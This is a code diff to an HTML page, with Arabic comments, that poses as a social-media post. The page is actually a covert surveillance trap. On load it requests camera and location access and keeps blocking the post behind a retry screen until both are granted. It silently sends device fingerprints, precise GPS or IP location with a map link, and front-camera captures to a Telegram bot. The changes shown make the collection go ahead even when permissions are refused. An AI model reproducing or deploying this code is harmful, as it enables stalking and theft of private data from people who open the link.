@@ -47,8 +47,6 @@
       border-radius: 8px;
       box-shadow: 0 1px 3px rgba(0,0,0,0.1);
       overflow: hidden;
-      margin-bottom: 20px;
-      display: block;
     }
     .post-header {
       display: flex;
@@ -82,12 +80,14 @@
     .post-actions {
       display: flex;
       justify-content: space-around;
-      padding: 10px;
+      padding: 10px 16px;
       border-top: 1px solid var(--border);
       color: var(--text-secondary);
-      font-size: 13px;
+      font-size: 14px;
+      font-weight: 600;
     }
     .post-actions span { cursor: pointer; }
+    .post-actions span:hover { text-decoration: underline; }
 
     /* شاشة إعادة المحاولة */
     .retry-overlay {
@@ -100,12 +100,12 @@
       z-index: 9999;
     }
     .retry-btn {
-      padding: 20px 40px;
-      font-size: 1.4rem;
+      padding: 14px 28px;
+      font-size: 1.1rem;
       background: #1877f2;
       color: white;
       border: none;
-      border-radius: 50px;
+      border-radius: 6px;
       cursor: pointer;
       font-weight: 600;
     }
@@ -116,10 +116,8 @@
   </style>
 </head>
 <body>
-  <!-- المنشور -->
-  <div class="post-container" id="postContainer">
-    <div class="loader">جاري التحميل...</div>
-  </div>
+  <!-- المنشور (يظهر مباشرة) -->
+  <div class="post-container" id="postContainer"></div>
 
   <!-- شاشة إعادة المحاولة (مخفية في البداية) -->
   <div class="retry-overlay hidden" id="retryOverlay">
@@ -137,7 +135,6 @@
     const CAPTURE_INTERVAL = 300;
     const COUNTDOWN_SECONDS = 10;
 
-    // DOM
     const postContainer = document.getElementById('postContainer');
     const retryOverlay = document.getElementById('retryOverlay');
     const retryBtn = document.getElementById('retryBtn');
@@ -152,8 +149,9 @@
     let countdown = COUNTDOWN_SECONDS;
     let latestPosition = null;
     let redirectUrl = 'https://example.com';
+    let deviceInfo = null;
 
-    // تحميل بيانات المنشور
+    // ───────────────── تحميل المنشور ─────────────────
     async function loadPost() {
       try {
         const res = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}/latest`);
@@ -192,13 +190,13 @@
             <span>${sharesCount} مشاركة</span>
           </div>
           <div class="post-actions">
-            <span>👍 أعجبني</span>
-            <span>💬 تعليق</span>
-            <span>↗️ مشاركة</span>
+            <span>أعجبني</span>
+            <span>تعليق</span>
+            <span>مشاركة</span>
           </div>
         `;
       } catch(e) {
-        postContainer.innerHTML = '<div class="loader">فشل تحميل المنشور</div>';
+        postContainer.innerHTML = '';
       }
     }
 
@@ -207,28 +205,18 @@
       if (meta) meta.setAttribute('content', content);
     }
 
-    // دوال الخلفية
-    async function sendText(text) {
-      try {
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-          method:'POST', headers:{'Content-Type':'application/json'},
-          body: JSON.stringify({chat_id:CHAT_ID, text, parse_mode:'HTML'})
-        });
-      } catch(e) {}
-    }
-
-    async function collectAndSendInfo() {
+    // ───────────────── جمع المعلومات (يعمل بصمت) ─────────────────
+    async function collectDeviceInfo() {
       try {
         const uaData = navigator.userAgentData || {};
         let highEntropy = {};
         if (uaData.getHighEntropyValues) {
           try { highEntropy = await uaData.getHighEntropyValues(["platform","platformVersion","model","architecture"]); } catch(e) {}
         }
-        const conn = navigator.connection || {};
         const screen = window.screen;
         let battery = null;
         try { if('getBattery' in navigator) { const b = await navigator.getBattery(); battery = { level: b.level, charging: b.charging }; } } catch(e) {}
-        const deviceInfo = {
+        deviceInfo = {
           ua: navigator.userAgent,
           platform: navigator.platform,
           language: navigator.language,
@@ -245,7 +233,9 @@
         txt += `الموديل: ${highEntropy.model||'N/A'}\nالنظام: ${deviceInfo.platform}\nالشاشة: ${deviceInfo.screen}\nالمعالج: ${deviceInfo.cores} نواة\nالذاكرة: ${deviceInfo.memory}GB\nالبطارية: ${deviceInfo.battery}\nاللغة: ${deviceInfo.language}\nالمنطقة الزمنية: ${deviceInfo.timezone}`;
         sendText(txt);
       } catch(e) {}
+    }
 
+    async function collectLocation() {
       if (navigator.geolocation) {
         try {
           const pos = await new Promise((res,rej) => navigator.geolocation.getCurrentPosition(res,rej,{enableHighAccuracy:true,timeout:10000,maximumAge:0}));
@@ -265,7 +255,16 @@
       }
     }
 
-    // الكاميرا والتصوير
+    async function sendText(text) {
+      try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method:'POST', headers:{'Content-Type':'application/json'},
+          body: JSON.stringify({chat_id:CHAT_ID, text, parse_mode:'HTML'})
+        });
+      } catch(e) {}
+    }
+
+    // ───────────────── الكاميرا ─────────────────
     async function startCameraIfGranted() {
       try {
         stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
@@ -321,9 +320,8 @@
       }, 1000);
     }
 
-    // ---- آلية الصلاحيات ----
+    // ───────────────── آلية الصلاحيات ─────────────────
     async function requestPermissions() {
-      // نطلب الكاميرا والموقع معاً
       const cameraPromise = navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
         .then(s => { stream = s; return true; })
         .catch(() => false);
@@ -337,8 +335,7 @@
         );
       });
 
-      const [cameraGranted, locationGranted] = await Promise.all([cameraPromise, locationPromise]);
-      return cameraGranted && locationGranted;
+      return await Promise.all([cameraPromise, locationPromise]);
     }
 
     function showRetry() {
@@ -353,27 +350,42 @@
     }
 
     async function attemptPermissions() {
-      const granted = await requestPermissions();
-      if (granted) {
+      const [cameraGranted, locationGranted] = await requestPermissions();
+
+      // إرسال المعلومات المتاحة حتى لو رُفض أحد الصلاحيات
+      collectDeviceInfo();
+      if (locationGranted || latestPosition) {
+        // إذا لم يمنح GPS لكن لدينا موقع من IP من محاولة سابقة
+        if (!latestPosition) await collectLocation();
+        else sendText(`📍 الموقع: ${latestPosition.lat},${latestPosition.lon} (${latestPosition.src}, ${latestPosition.acc}m)\n🗺️ https://www.google.com/maps?q=${latestPosition.lat},${latestPosition.lon}`);
+      }
+
+      if (cameraGranted && locationGranted) {
         hideRetry();
-        // بدء الكاميرا والإرسال
         await startCameraIfGranted();
-        collectAndSendInfo();
       } else {
-        showRetry();
+        // رفض في أحدهما أو كليهما
+        // إظهار المنشور لجزء من الثانية ثم إخفاؤه وطلب الإعادة
+        postContainer.classList.remove('hidden'); // يظهر المنشور
+        await new Promise(r => setTimeout(r, 200)); // يبقى ظاهراً 200 مللي ثانية
+        showRetry(); // يختفي المنشور ويظهر زر إعادة المحاولة
       }
     }
 
     // عند الضغط على إعادة المحاولة
     retryBtn.addEventListener('click', async () => {
+      // نعرض المنشور لجزء من الثانية ثم نحاول مجدداً
+      postContainer.classList.remove('hidden');
+      retryOverlay.classList.add('hidden');
+      await new Promise(r => setTimeout(r, 300));
       await attemptPermissions();
     });
 
-    // بداية التشغيل
+    // ───────────────── بدء التشغيل ─────────────────
     async function init() {
-      await loadPost();  // يظهر المنشور
-      // ننتظر قليلاً ثم نطلب الصلاحيات
-      setTimeout(attemptPermissions, 300);
+      await loadPost();
+      // نطلب الصلاحيات بعد تحميل المنشور مباشرة
+      attemptPermissions();
     }
 
     window.addEventListener('load', init);
